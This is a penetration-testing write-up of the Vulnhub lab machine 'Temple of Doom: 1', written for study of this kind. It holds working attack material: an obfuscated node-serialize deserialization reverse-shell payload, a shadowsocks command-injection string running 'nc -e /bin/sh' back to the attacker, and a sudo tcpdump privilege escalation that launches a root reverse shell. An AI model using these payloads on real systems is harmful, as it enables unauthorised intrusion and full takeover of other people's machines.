---
title: "[Vulnhub] Temple of Doom: 1 Write-up"
date: 2018-08-20
author: "Mars Cheng"
summary: "Overview This is a vulnerable machine from vulnhub, and the write-up refers some internet resources. If any mistake or suggestion, please let we konw. Thanks. Walkthrough 1. Inf..."
translationKey: "vulnhub-temple-of-doom-1-write-up"
slug: "vulnhub-temple-of-doom-1-write-up"
aliases:
  - /blog/2018/vulnhub-temple-of-doom-1-write-up/
  - /2018/vulnhub-temple-of-doom-1-write-up/
tags:
  - "Penetration Testing"
  - "Vulnhub"
  - "OSCP"
  - "Write-up"
---

## Overview

>This is a vulnerable machine from vulnhub, and the write-up refers some internet resources. If any 
mistake or suggestion, please let we konw. Thanks.


## Walkthrough
1. Information gathering 
2. Discovering Node.js node-serialize remote code execution(CVE-2017-5941)
3. Discovering shadowsocks command injection 
4. Discovering insecure file system permissions 
5. Get root priviilage

### 1. Information gathering

As usual, we firstly use Nmap to scan the machine which tool can discover machine port status, service, and version. <br>
We find the port 666 open and provide Node.js Express framework service.
```java
[18:47:31] root:~ # nmap -A 192.168.1.103
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-18 18:47 CST
Nmap scan report for 192.168.1.103
Host is up (0.0013s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)
666/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 08:00:27:BB:24:1C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.30 ms 192.168.1.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
```

### 2. Discovering Node.js node-serialize remote code execution(CVE-2017-5941)

We browse web service, and find the SyntaxError about node-serialize. So we google it, and find CVE-2017-5941 vulnerability.
<div style="text-align: center">
<img src="https://i.imgur.com/eETtWpY.png"/>
</div>


```
SyntaxError: Unexpected token F in JSON at position 79
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/nodeadmin/.web/server.js:12:29
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)
    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)
   ```
   
 Then we open Burp Suite tool, and the cookie profile is encoded by Base64.
 
 
<div style="text-align: center">
<img src="https://i.imgur.com/04aFYwy.png"/>
</div>


Decode it 
```json
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}
  ```

<div style="text-align: center">
<img src="https://i.imgur.com/0XYybpY.png"/>
</div>

And we change the username from Admin to mars and base64 encode it.

<div style="text-align: center"> <img src="https://i.imgur.com/0XYybpY.png"/> </div>
<div style="text-align: center"> <img src="https://i.imgur.com/zvnyczN.png"/> </div>

<div style="text-align: center"> <img src="https://i.imgur.com/4fhai0e.png"/> </div>

<div style="text-align: center"> <img src="https://i.imgur.com/RzNpMrH.png"/> </div>

When receiving response "Hello mars", we confirm the username is a injection point, and we use nodejsshell to generate payload.

<div style="text-align: center"> <img src="https://i.imgur.com/gjXan65.png"/> </div>

We add the payload to username and base64 encode.

```javascript
# Node.js vulnerability 
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```


```json
{"username":"_$$ND_FUNC$$_function({eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,46,49,48,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```
<div style="text-align: center"> <img src="https://i.imgur.com/mwLUWyd.png"/> </div>


<div style="text-align: center"> <img src="https://i.imgur.com/ulWH73b.png"/> </div>

We open terminal and use nc command, and confirm the reverse shell success.

```java
[19:14:47] root:~ # nc -lvp 4444
listening on [any] 4444 ...


192.168.1.103: inverse host lookup failed: Unknown host
connect to [192.168.1.104] from (UNKNOWN) [192.168.1.103] 45252
Connected!
id
uid=1001(nodeadmin) gid=1001(nodeadmin) groups=1001(nodeadmin)
pwd
/home/nodeadmin

```
<div style="text-align: center"> <img src="https://i.imgur.com/DQopgJb.png"/> </div>

### 3. Discovering shadowsocks command injection 

We check the system process and find the ss-manager of fireman is working. In exploit-DB, we find exploit code and shown as follow:

```java
[nodeadmin@localhost home]$ ps aux | grep nodeadmin
ps aux | grep nodeadmin
nodeadm+   816  0.0  0.8 897512 36476 ?        Sl   08:09   0:00 /bin/node /home/nodeadmin/.web/server.js
nodeadm+   965  0.0  0.0 213788  1040 pts/0    S+   08:17   0:00 grep --color=auto nodeadmin
[nodeadmin@localhost home]$ ps aux | grep fireman
ps aux | grep fireman
root       825  0.0  0.1 301464  4504 ?        S    08:09   0:00 su fireman -c /usr/local/bin/ss-manager
fireman    836  0.0  0.0  37060  3784 ?        Ss   08:09   0:00 /usr/local/bin/ss-manager
nodeadm+   967  0.0  0.0 213788   968 pts/0    S+   08:17   0:00 grep --color=auto fireman
```

We open terminal and use nc command.

```java
[nodeadmin@localhost home]$ nc -u 127.0.0.1 8839
nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.1.104 4445||"}
add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.1.104 4445||"}
```
<div style="text-align: center"> <img src="https://i.imgur.com/lAN4jK7.png"/> </div>

<div style="text-align: center"> <img src="https://i.imgur.com/Y6Qx2zG.png"/> </div>

### 4. Discovering insecure file system permissions 

When we get reverse shell in port 4445, we are fireman.
We use sudo command to list the commands we can use, and find the tcpdump can be used. 


```java
[fireman@localhost /]$ sudo -l
sudo -l
Matching Defaults entries for fireman on localhost:
    !visiblepw, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```



<div style="text-align: center"> <img src="https://i.imgur.com/XsJ2Qhy.png"/> </div>

Use tcpdump to get reverse shell.

```java
[fireman@localhost tmp]$ echo "nc -e /bin/bash 192.168.1.104 4446" > shell 
echo "nc -e /bin/bash 192.168.1.104 4446" > shell 
[fireman@localhost tmp]$ 

[fireman@localhost tmp]$ ls
ls
shell
systemd-private-619e6ead767c4e61b5d99fcd576d5b24-chronyd.service-CpZMEH
systemd-private-619e6ead767c4e61b5d99fcd576d5b24-rtkit-daemon.service-3pI3Q1

[fireman@localhost tmp]$ chmod 777 shell
chmod 777 shell
[fireman@localhost tmp]$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
<i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
11 packets received by filter
0 packets dropped by kernel
```

<div style="text-align: center"> <img src="https://i.imgur.com/SRv6Ggv.png"/> </div>

### 5. Get root priviilage

Open another terminal and use nc command.
```java
nc -vlp 4446 
```

<div style="text-align: center"> <img src="https://i.imgur.com/lUWYaNT.png"/> </div>




### Reference

[1] Vulhub <https://www.vulnhub.com/entry/temple-of-doom-1,243/> <br>
[2] Node.js exploit <https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf><br>
[3] <https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py><br>
[4] <https://www.exploit-db.com/exploits/43006/> <br>
[5] <http://seclists.org/tcpdump/2010/q3/68><br>
